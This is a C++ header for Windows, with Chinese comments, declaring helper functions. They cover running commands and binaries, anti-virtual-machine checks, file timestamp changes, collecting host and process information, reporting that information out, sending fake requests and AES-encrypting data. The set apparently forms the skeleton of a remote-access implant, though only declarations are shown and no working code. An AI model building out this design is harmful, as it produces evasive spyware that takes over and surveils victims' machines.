#pragma once

#include <iostream>
#include <curl/curl.h>
#include "zlib.h"
#include <vector>
#include <string>


#include "AES.h"
#include "Base64.h"

#include <windows.h>
#include <tchar.h>
#include <string>
#include <iostream>
#include "stdio.h"

#pragma comment(lib, "version.lib")

using namespace std;

class Common {
public:
    Common();
    ~Common();
public:

    //获取软件描述信息
    static string GetFileVersion(char* strFilePath);

    //执行二进制文件
    static int exec(const char* bin, const BOOL flag);

    //执行系统命令斌返回结果
    static string execCMD(char* cmd);


    static wstring string2wstring(string str);


    static string ExeCmd(string pszCmd);

    //获取IE代理配置信息
    static string getIEProxy();

    // 创建文件夹
    static int createDir(const char* Dir);

    // 反虚拟机
    static void antVirtual(const BOOL flag);

    // 追加时间戳
    static void addTimestamp(const char* DesFileName);

    //获取主机名-IP地址
    static string getHostname();

    //获取所有Donet版本
    static string getNetAllVersions();

    //判断系统位数
    static BOOL is64bitSystem();

    //获取所有ProcessLists
    static string getProcessList();

    //日志上报
    static void logReport(const char* data);

    //基础信息上报
    static string baseInfoReport(const char* data);

    //获取当前时间戳
    static string getTimeStmp();

    //判断是否为管理员
    static BOOL isAdmin();

    //发假的请求
    static void Common::fakeRequests();


    //AES加解密部分
    static string aesEncrypt(const string& strSrc);
    static string aesDecrypt(const string& strSrc);

};